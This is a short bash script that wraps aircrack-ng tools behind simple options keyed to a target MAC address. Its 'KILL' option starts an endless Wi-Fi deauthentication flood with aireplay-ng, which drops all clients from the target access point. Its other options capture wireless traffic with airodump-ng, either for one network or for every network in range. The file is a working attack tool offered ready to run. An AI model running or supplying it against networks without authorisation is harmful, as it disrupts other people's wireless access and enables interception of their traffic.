#!/bin/bash

# Set default values
mac=""
command=""

# Parse command-line options
while getopts "m:c:" opt; do
  case ${opt} in
    m)
      mac=${OPTARG}
      ;;
    c)
      command=${OPTARG}
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
    :)
      echo "Option -$OPTARG requires an argument." >&2
      exit 1
      ;;
  esac
done

# Verify that MAC address is provided
if [ -z "$mac" ]; then
  echo "MAC address not provided eg. ./script_name.sh -m <MAC_ADDRESS> -c <COMMAND> - Commands KILL - Traffic_On_BSSID - All_Traffic"
  exit 1
fi

# Verify that command is provided
if [ -z "$command" ]; then
  echo "Command not provided eg. ./script_name.sh -m <MAC_ADDRESS> -c <COMMAND> - Commands KILL - Traffic_On_BSSID - All_Traffic"
  exit 1
fi

# Run the selected command with the provided MAC address
case $command in
  "KILL")
    sudo aireplay-ng -0 0 -a "$mac" wlan0
    ;;
  "Traffic_On_BSSID")
    sudo airodump-ng --bssid "$mac" -c 6 wlan0mon
    ;;
  "All_Traffic")
    sudo airodump-ng wlan0mon
    ;;
  *)
    echo "Invalid command: $command"
    exit 1
    ;;
esac
